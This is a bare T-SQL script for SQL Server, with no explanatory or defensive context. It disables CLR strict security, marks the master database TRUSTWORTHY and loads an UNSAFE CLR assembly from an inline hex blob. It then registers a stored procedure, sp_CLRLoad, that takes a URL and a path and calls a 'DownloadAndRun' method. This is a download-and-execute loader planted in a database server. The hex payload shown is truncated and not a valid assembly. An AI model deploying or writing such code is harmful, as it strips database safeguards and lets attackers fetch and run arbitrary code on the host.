    EXEC sp_configure 'clr strict security', 0;
    RECONFIGURE;
    
    ALTER DATABASE [master] SET TRUSTWORTHY ON;
    
    IF EXISTS (SELECT * FROM sys.procedures WHERE name = 'sp_CLRLoad')
        DROP PROCEDURE [dbo].[sp_CLRLoad];
    
    IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'CLRLoader')
        DROP ASSEMBLY [CLRLoader];
    
    DECLARE @clr_hex NVARCHAR(MAX) = N'' + N'   0072006f0064007500630074004e0061006d006500000000006400790070 ';
    
    EXEC('CREATE ASSEMBLY [CLRLoader] FROM 0x' + @clr_hex + ' WITH PERMISSION_SET = UNSAFE');
    
    CREATE PROCEDURE [dbo].[sp_CLRLoad]
        @url NVARCHAR(512),
        @path NVARCHAR(512)
    AS EXTERNAL NAME [CLRLoader].[StoredProcedures].[DownloadAndRun];
    
